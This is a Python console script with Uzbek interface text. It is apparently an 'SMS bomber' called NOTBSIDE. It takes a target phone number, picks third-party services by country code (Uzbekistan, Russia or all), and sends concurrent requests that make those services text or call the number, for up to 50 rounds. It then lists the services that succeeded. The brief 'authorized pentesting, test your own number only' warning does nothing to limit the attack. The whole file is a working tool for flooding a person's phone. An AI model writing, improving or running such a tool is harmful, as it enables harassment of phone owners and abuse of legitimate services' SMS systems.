#!/usr/bin/env python3
"""
NOTBSIDE - Optimized Console Attack Tool
Faqat ishlaydigan servislar, UZ + ALL prioritet
"""
import asyncio
import sys
from time import sleep
from aiohttp import ClientSession

sys.path.insert(0, '/mnt/ssd2/INSIDE-main')

from Core.Attack.Services import urls
from Core.Attack.Feedback_Services import feedback_urls
from Core.Config import check_config

# Colors
GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
CYAN = '\033[96m'
RESET = '\033[0m'
BOLD = '\033[1m'

def print_banner():
    banner = f"""
{GREEN}{BOLD}
    _   ______  ________  _____ ________  ______
   / | / / __ \\/_  __/ / / / _ / ___/ /  / / __ \\
  /  |/ / / / / / / / / / / / | \\__ \\/ / / / / / /
 / /|  / /_/ / / / / /_/ / /  | ___/ / /_/ / /_/ /
/_/ |_/\\____/ /_/  \\____/_/   /____/\\____/\\____/
{RESET}
{CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}
{YELLOW}  OPTIMIZED Version - Faqat ishlaydigan servislar{RESET}
{CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}
"""
    print(banner)

def filter_services_by_country(services, number):
    """Filter services by phone number country code"""
    # Detect country
    if number.startswith('998'):
        # Uzbekistan - use UZ and ALL
        filtered = [s for s in services if s['info']['country'] in ['UZ', 'ALL']]
        country_name = "O'zbekiston"
    elif number.startswith('7'):
        # Russia - use RU and ALL
        filtered = [s for s in services if s['info']['country'] in ['RU', 'ALL']]
        country_name = "Rossiya"
    else:
        # Other - use ALL only
        filtered = [s for s in services if s['info']['country'] == 'ALL']
        country_name = "Noma'lum"

    return filtered, country_name

async def send_request(session, service, retry=1):
    """Send request with retry"""
    for attempt in range(retry):
        try:
            type_attack_config = check_config()['type_attack']
            type_attack = ('SMS', 'CALL', 'FEEDBACK') if type_attack_config == 'MIX' else type_attack_config

            if service['info']['attack'] not in type_attack:
                return None

            async with session.request(
                service['method'],
                service['url'],
                params=service.get('params'),
                cookies=service.get('cookies'),
                headers=service.get('headers'),
                data=service.get('data'),
                json=service.get('json'),
                timeout=20
            ) as response:
                status = response.status
                text = await response.text()

                # Success indicators
                success_keywords = [
                    'sent', 'success', 'ok', 'true', 'отправлен', 'yuborildi',
                    'pin_sent', 'code_sent', 'sms_sent', 'отправлено', 'successful'
                ]
                is_success = any(keyword in text.lower() for keyword in success_keywords) and 200 <= status < 300

                return {
                    'website': service['info']['website'],
                    'country': service['info']['country'],
                    'attack': service['info']['attack'],
                    'status': status,
                    'success': is_success,
                    'response': text[:150]
                }
        except asyncio.TimeoutError:
            if attempt < retry - 1:
                await asyncio.sleep(1)
                continue
            return None
        except Exception as e:
            return None

    return None

async def run_attack(number, use_delay=False):
    """Run attack with optional delay"""
    config = check_config()

    # Load and filter services
    all_services = urls(number)
    feedback_services = feedback_urls(number)

    # Filter by country
    filtered_main, country_name = filter_services_by_country(all_services, number)
    filtered_feedback, _ = filter_services_by_country(feedback_services, number)

    if config['feedback'] == 'True':
        services = filtered_main + filtered_feedback
    else:
        services = filtered_main

    print(f"\n{BLUE}[i] Mamlakatni aniqlandi: {BOLD}{country_name}{RESET}")
    print(f"{CYAN}[*] Filtrlangan servislar: {len(services)} ta{RESET}")
    print(f"{CYAN}[*] So'rovlar yuborilmoqda...{RESET}")

    if use_delay:
        print(f"{YELLOW}[!] Delay mode: har 10 ta servisda 1 soniya kutiladi{RESET}")

    print(f"{YELLOW}[!] Bu 15-25 soniya davom etadi{RESET}\n")

    # Send requests with optional delay
    results = []
    async with ClientSession() as session:
        if use_delay:
            # Send in batches with delay
            batch_size = 10
            for i in range(0, len(services), batch_size):
                batch = services[i:i+batch_size]
                tasks = [send_request(session, service, retry=1) for service in batch]
                batch_results = await asyncio.gather(*tasks)
                results.extend(batch_results)

                if i + batch_size < len(services):
                    await asyncio.sleep(1)  # Delay between batches
        else:
            # Send all at once
            tasks = [send_request(session, service, retry=1) for service in services]
            results = await asyncio.gather(*tasks)

    # Filter and count
    valid_results = [r for r in results if r is not None]
    success_results = [r for r in valid_results if r.get('success', False)]

    return valid_results, success_results

def main():
    print_banner()

    # Check config
    config = check_config()
    print(f"{BLUE}[i] Sozlamalar:{RESET}")
    print(f"    • Attack type: {BOLD}{config['type_attack']}{RESET}")
    print(f"    • Feedback: {BOLD}{config['feedback']}{RESET}")
    print()

    # Input number
    while True:
        number = input(f"{GREEN}[?] Raqamni kiriting: {RESET}").strip()
        if not number:
            print(f"{RED}[!] Raqam kiritilmadi!{RESET}")
            continue
        if not number.isdigit():
            print(f"{RED}[!] Faqat raqamlar kiriting!{RESET}")
            continue
        if len(number) < 9:
            print(f"{RED}[!] Raqam juda qisqa!{RESET}")
            continue
        break

    # Input circles
    while True:
        circles = input(f"{GREEN}[?] Necha marta (1-50): {RESET}").strip() or "1"
        if not circles.isdigit():
            print(f"{RED}[!] Faqat son kiriting!{RESET}")
            continue
        circles_int = int(circles)
        if circles_int < 1 or circles_int > 50:
            print(f"{RED}[!] 1 dan 50 gacha!{RESET}")
            continue
        break

    # Delay mode
    print()
    use_delay_input = input(f"{GREEN}[?] Delay mode ishlatilsinmi? (ha/yo'q, default: yo'q): {RESET}").strip().lower()
    use_delay = use_delay_input in ['ha', 'yes', 'y', 'xa']

    # Confirmation
    print()
    print(f"{YELLOW}{'='*60}{RESET}")
    print(f"{YELLOW}[!] DIQQAT:{RESET}")
    print(f"    • Faqat o'z raqamingizda test qiling!")
    print(f"    • Authorized pentesting uchun")
    print(f"    • Optimized: faqat {number[:3]} uchun servislar")
    print(f"{YELLOW}{'='*60}{RESET}")
    print()

    confirm = input(f"{GREEN}[?] Boshlashni tasdiqlaysizmi? (ha/yo'q): {RESET}").strip().lower()
    if confirm not in ['ha', 'yes', 'y', 'xa']:
        print(f"\n{RED}[!] Bekor qilindi{RESET}\n")
        return

    # Run attacks
    print(f"\n{CYAN}{'='*60}{RESET}")
    print(f"{BOLD}{GREEN}[+] OPTIMIZED ATTACK BOSHLANDI{RESET}")
    print(f"{CYAN}{'='*60}{RESET}\n")

    total_requests = 0
    total_success = 0
    all_success_services = []

    for i in range(circles_int):
        print(f"{BLUE}[*] Circle {i+1}/{circles_int}{RESET}")
        print(f"{BLUE}{'─'*60}{RESET}")

        # Run attack
        valid_results, success_results = asyncio.run(run_attack(number, use_delay))

        total_requests += len(valid_results)
        total_success += len(success_results)
        all_success_services.extend(success_results)

        # Show results
        print(f"\n{GREEN}[✓] So'rovlar yuborildi: {len(valid_results)}{RESET}")
        print(f"{GREEN}[✓] SMS yuborilgan: {BOLD}{len(success_results)}{RESET}{GREEN} ta{RESET}")

        if success_results:
            print(f"\n{YELLOW}[+] SMS yuborgan servislar:{RESET}")
            for j, s in enumerate(success_results[:15], 1):
                country_flag = "🇺🇿" if s['country'] == 'UZ' else "🌍"
                print(f"    {j:2}. {country_flag} {s['website']:25} [{s['attack']}]")

            if len(success_results) > 15:
                print(f"    ... va yana {len(success_results) - 15} ta")
        else:
            print(f"\n{YELLOW}[!] Hech qanday servis SMS yubormadi{RESET}")
            print(f"{YELLOW}[!] Sabablari:{RESET}")
            print(f"    • Rate limiting (juda ko'p urinish)")
            print(f"    • Eski servislar")
            print(f"    • Raqam oldin ro'yxatdan o'tgan")

        print()

        if i < circles_int - 1:
            wait_time = 5 if use_delay else 3
            print(f"{CYAN}[*] Keyingi circle uchun {wait_time} soniya kutilmoqda...{RESET}\n")
            sleep(wait_time)

    # Final summary
    print(f"\n{CYAN}{'='*60}{RESET}")
    print(f"{BOLD}{GREEN}[✓] ATTACK YAKUNLANDI!{RESET}")
    print(f"{CYAN}{'='*60}{RESET}\n")

    print(f"{BLUE}[i] Jami statistika:{RESET}")
    print(f"    • Jami so'rovlar: {BOLD}{total_requests}{RESET}")
    print(f"    • SMS yuborilgan: {BOLD}{total_success}{RESET}")
    if total_requests > 0:
        print(f"    • Muvaffaqiyat: {BOLD}{(total_success/total_requests*100):.1f}%{RESET}")

    # Show unique successful services
    if all_success_services:
        unique_services = {}
        for s in all_success_services:
            key = s['website']
            if key not in unique_services:
                unique_services[key] = s

        print(f"\n{YELLOW}[+] Ishlaydigan servislar ro'yxati ({len(unique_services)} ta):{RESET}")
        for i, (name, s) in enumerate(list(unique_services.items())[:20], 1):
            country_flag = "🇺🇿" if s['country'] == 'UZ' else "🌍"
            print(f"    {i:2}. {country_flag} {name}")

        if len(unique_services) > 20:
            print(f"\n    ... va yana {len(unique_services) - 20} ta servis")

    print(f"\n{GREEN}{'─'*60}{RESET}")
    print(f"{GREEN}[i] SMS 1-5 daqiqada kelishi kerak{RESET}")
    print(f"{GREEN}[i] Ba'zi servislar eski/ishlamasligi mumkin{RESET}")
    print(f"{GREEN}[i] Agar SMS kelmasa - rate limit sabab bo'lishi mumkin{RESET}")
    print(f"{GREEN}{'─'*60}{RESET}\n")

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{RED}[!] To'xtatildi (Ctrl+C){RESET}\n")
        sys.exit(0)
    except Exception as e:
        print(f"\n{RED}[!] Xato: {e}{RESET}\n")
        import traceback
        traceback.print_exc()
        sys.exit(1)
